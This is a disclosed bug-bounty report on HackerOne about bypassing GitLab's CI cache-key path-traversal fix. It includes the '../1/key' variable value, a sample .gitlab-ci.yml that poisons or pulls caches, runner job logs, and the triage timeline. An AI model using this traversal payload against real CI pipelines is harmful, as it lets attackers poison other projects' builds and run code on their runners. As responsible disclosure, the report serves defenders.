---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-input-validation
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Improper Input Validation"
enriched: true
body: true
date: 2019-04-10
submitted: 2018-09-13T11:50:47.225Z
bounty_usd: null
votes: 363
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "ngalog"
source: "https://hackerone.com/reports/409395"
title: "Bypass of GitLab CI runner slash fix in YAML validation"
---
# Bypass of GitLab CI runner slash fix in YAML validation

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 363 | **Program:** GitLab | **Disclosed:** 2019-04-10

- Report: [https://hackerone.com/reports/409395](https://hackerone.com/reports/409395)
- CWE: Improper Input Validation
- Submitted: 2018-09-13T11:50:47.225Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Gitlab Security,

I notice the bug #301432 that Jobert reported earlier is could be bypassed by setting variable in environment.

The reason is that the fix in place preventing url normalization is performed by doing the YAML  validation, however this could be bypassed by setting the environment variable in `https://gitlab.com/{project_id}/settings/ci_cd`

By setting the key ONE and variable value to `../1/key`, it is possible to replicate what jobert did in #301432.

And in `.gitlab-ci.yml`

```
a:
  script:
  - echo "script"
  - echo "a"
  cache:
    key: "$ONE"
    policy: pull #or push if you like to poison
    paths:
      - .
```

Then make any change to `.gitlab-ci.yml` will trigger the bug once again.

Download from cache
{F345819}
Setting environment variable
{F345820}
Upload to cache
{F345821}

## Impact

Quoting from  #301432
```
Depending on the files that are cached, this may allow an attacker to run arbitrary code on a victim's Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.
```

## Timeline

- **Report Filed**
- **2018-09-13** @jritchey: Hi @ngalog  ,

Thank you for submitting this report. We are currently investigating the issue. Due to our current workload, we will get back within the next week with an update.

Best regards,
James
- **2018-09-16** @ngalog: Btw, is open redirect in scope?

Thanks,
Ron
- **Report Needs More Info**
- **Report New**
- **2018-09-17** @ngalog: Hi James,

I think this bug has escalated to a higher severity, the reason is on Sep 13th, when I trigger CI/CD, the cache is uploaded to internal gitlab url, but when I do it today, the cache is `pushed/pulled` `to/from` `https://storage.googleapis.com/`

Part of job logs when user @golduserngalog push cache to ../1/key to storage.googleapis.com

```
++ /usr/bin/gitlab-runner-helper cache-archiver --file ../../../cache/golduserngalog/1/key/cache.zip --timeout 10 --path . --url 'https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key?Expires=1537225143&GoogleAccessId=runners-cache%40gitlab-ci-155816.iam.gserviceaccount.com&Signature=lJ5OCDRLA8e8UOzUFpoeq3q%2BEeD8HGzP5gq2Uflanw1zDphOjFEuFD%2FEOkBqDK1181a8V2k5o16mbhAuimCKLlPyumMc0vU%2B%2B3IPa1P6MmaO7WIRTmWwPtF42F%2BSmxvMzxf0eYxmFGA%2FWcXf0dyQL3La4Gj0cF92XAjMwJAcJXyCe7awlk8GO3Y30RLVqta7sv6lhbKVCmMgXYV7OC0z4J7awrh9rol2C7zV4f2T3SIF7XwFTIkskJQEt9gbCIH7k5Z64%2FT%2F%2BEHbfrM5d9GjB%2FBUIeeLUFSzPCjatz49%2B13kHwUEB1TGGMQlIq2DZDfljLSqptluByPNSwMAG63vzQ%3D%3D'
.: found 67 matching files
RNING: Part of .git directory is on the list of files to archive
h
ading cache.zip to https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key
Created cache

```

Part of job logs when user @ngalongc pull cache ../1/key from storage.googleapis.com

```

++ /usr/bin/gitlab-runner-helper cache-extractor --file ../../../cache/ngalongc/1/key/cache.zip --timeout 10 --url 'https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key?Expires=1537225641&GoogleAccessId=runners-cache%40gitlab-ci-155816.iam.gserviceaccount.com&Signature=YQFV2mLJ7rtWESllr7h%2BTU63n%2Bk3lrS2ggm7izfxoeOBXte5w8RMXSN0LdL%2FqM4ZFdldrEfUXeQDvOJLCXq7UdhNovTn63mrjnNGZnP5La9ApKzETLkrejEXsILoWFMysS1%2FXuKkD2FljaUxTiIE0etU1HbT1HCwR%2BSqkY65Kwpjq6UWIM8ehnuHZD1CKdx2M7wndjbdaWgaaWIcfGHndI5KycZUooRPrkr8ZcbTIxkj2SbYwoR0dL4ua3pGKtTm%2BbH29JSxylHXkv%2BMx12l%2FM5XJG4chojyecc1IFzqiinQGl2ytJD3PxjKKRYW5z8lR1ZTdGhQuUkYtUm8jmPctw%3D%3D'
Downloading cache.zip from https://storage.googleapis.com/gitlab-com-runners-cache/project/1/key
RNING: Part of .git directory is on the list of files to extract
RNING: This may introduce unexpected problems
Successfully extracted cache
```



The reason that you couldnt make it work because i was pushing to gitlab internal cache system, but if you do it again now with the same exact steps, you will be able to pull the ../1/key, because now i have pushed to the path ../1/key

Also, the updated impact is I can upload or download any thing under https://storage.googleapis.com/gitlab-com-runners-cache/

You can search in the log for `storage.googleapis.com` and you will understand this is possible

Finally, in the mean time I will explore how could I trigger the directory listing of storage.googleapis.com to avoid blindly guessing the cache key and project id, I will update here if I succeed.

{F347517}
- **2018-09-18** @ngalog: Just found out that Google storage has no concept of directory, there is only object with `/` in the name, so directory listing is not possible in this situation.

Still, this allow me to push/pull anything to the gitlab cache bucket `https://storage.googleapis.com/gitlab-com-runners-cache/` with arbitrary key

Thanks,
Ron
- **2018-09-18** @jritchey: Hi @ngalog ,

Thank you for the updates. We are working internally on investigating and mitigating the issue at https://gitlab.com/gitlab-org/gitlab-runner/issues/3589.

The issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.

Best regards,
James
- **Report Triaged**
- **2018-11-15** @ngalog: Hi James,

It has been two months and I notice this was fixed back in Oct, is there anything stopping this from getting resolved?

Cheers,
Ron
- **Report Vulnerability Types Updated**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
